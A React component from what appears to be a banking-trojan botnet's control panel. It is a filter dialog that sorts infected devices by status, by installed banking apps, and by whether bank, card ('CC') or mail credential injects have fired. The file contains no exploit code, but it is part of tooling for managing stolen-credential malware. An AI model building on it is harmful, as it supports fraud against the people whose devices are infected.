import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { try_eval } from '../../serviceF';
import OnOffSwitcher from './OnOffSwitcher';
import InjectListNamer from './InjectListNamer';

class BotSortModal extends React.Component {
    constructor(props)
    {
        super(props);
        this.state = {
            botOnline: SettingsContext.BotsFilterMode[0],
            botOffline: SettingsContext.BotsFilterMode[1],
            botDead: SettingsContext.BotsFilterMode[2],
            botHaveExistBanks: SettingsContext.BotsFilterMode[3],
            botHaveNotExistBanks: SettingsContext.BotsFilterMode[4],
            botTriggerStatBanks: SettingsContext.BotsFilterMode[5],
            botTriggerStatCC: SettingsContext.BotsFilterMode[6],
            botTriggerStatMail: SettingsContext.BotsFilterMode[7],
            botsPerPage: SettingsContext.BotsPerPage
        };
    }
    /**
    1 - online
    2 - offline
    3 - dead
    4 - Exist App Banks
    5 - No Exist App Banks
    6 - statBank==1
    7 - statCC==1
    8 - statMail==1
     */

    componentWillReceiveProps() {

    }

    ChangeSettings() {
        this.props.BotListForceUpdate();
        SettingsContext.SaveSettingsCookies();
    }

    HideThisModal() {
        try_eval('$("#BotSortTableModal").modal("hide");');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    componentDidMount() {
        try_eval('UpdateToolTips();');
    }

    callbackBtn(Value, BtnParam) {
        if(BtnParam == "botOnline"){
            this.state.botOnline = Value;
        }
        else if(BtnParam == "botOffline"){
            this.state.botOffline = Value;
        }
        else if(BtnParam == "botDead"){
            this.state.botDead = Value;
        }
        else if(BtnParam == "botHaveExistBanks"){
            this.state.botHaveExistBanks = Value;
        }
        else if(BtnParam == "botHaveNotExistBanks"){
            this.state.botHaveNotExistBanks = Value;
        }
        else if(BtnParam == "botTriggerStatBanks"){
            this.state.botTriggerStatBanks = Value;
        }
        else if(BtnParam == "botTriggerStatCC"){
            this.state.botTriggerStatCC = Value;
        }
        else if(BtnParam == "botTriggerStatMail"){
            this.state.botTriggerStatMail = Value;
        }
    }

    SaveSettings() {
        SettingsContext.BotsFilterMode =
            this.state.botOnline + 
            this.state.botOffline + 
            this.state.botDead + 
            this.state.botHaveExistBanks + 
            this.state.botHaveNotExistBanks + 
            this.state.botTriggerStatBanks + 
            this.state.botTriggerStatCC + 
            this.state.botTriggerStatMail;
        SettingsContext.BotsPerPage = this.state.botsPerPage;
        this.ChangeSettings();
        this.HideThisModal();
    }

    checkOnlyNumbers(val) {
        return parseInt(val) ? true : false;
    }

    onChangeBotsPerPage = (e) => {
        if(this.checkOnlyNumbers(e.target.value)) {
            this.setState({ 
                botsPerPage: parseInt(e.target.value.substring(0,3))
            });
        }
        else if(e.target.value == '') {
            this.setState({ 
                botsPerPage: ''
            });
        }
    }

    OnFocusChange = (e) => {
        if(e.target.value == '') {
            this.setState({ 
                botsPerPage: SettingsContext.BotsPerPage
            });
        }
    }

    render() {
        return (
          //<!-- Modal -->
            <div class="modal fade" id="BotSortTableModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
                <div class="modal-dialog modal-dialog-centered" role="document">
                    <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="exampleModalLongTitle">{"Filter table"}</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                    <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only Online Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botOnline"} status={this.state.botOnline} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only Offline Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botOffline"} status={this.state.botOffline} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Only dead Bots <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botDead"} status={this.state.botDead} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Bots have exist banks <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botHaveExistBanks"} status={this.state.botHaveExistBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Bots not have exist banks <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botHaveNotExistBanks"} status={this.state.botHaveNotExistBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Banks inject triggered <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botTriggerStatBanks"} status={this.state.botTriggerStatBanks} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                CC inject triggered <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botTriggerStatCC"} status={this.state.botTriggerStatCC} />
                                </li>
                            </ol>
                        </nav>
                        <nav aria-label="breadcrumb">
                            <ol class="breadcrumb">
                                <li class="liwidth100" aria-current="page">
                                Mails inject triggered <OnOffSwitcher callback={this.callbackBtn.bind(this)} name={"botTriggerStatMail"} status={this.state.botTriggerStatMail} />
                                </li>
                            </ol>
                        </nav>
                        <div class="input-group input-group-sm mb-3">
                            <div class="input-group-prepend">
                                <span class="input-group-text" id="inputGroup-sizing-sm">Bots per page</span>
                            </div>
                            <input type="text" value={this.state.botsPerPage} pattern="[0-9]*" onChange={this.onChangeBotsPerPage.bind(this)} class="form-control" aria-label="Bots per page" aria-describedby="inputGroup-sizing-sm" />
                        </div>
                        <div class="modal-footer">
                            <button type="button" onBlur={this.OnFocusChange.bind(this)} onClick={this.SaveSettings.bind(this)} class="btn btn-outline-warning">Apply filter</button>
                        </div>
                    </div>
                    </div>
                </div>
            </div>
      );
    }
}

export default BotSortModal;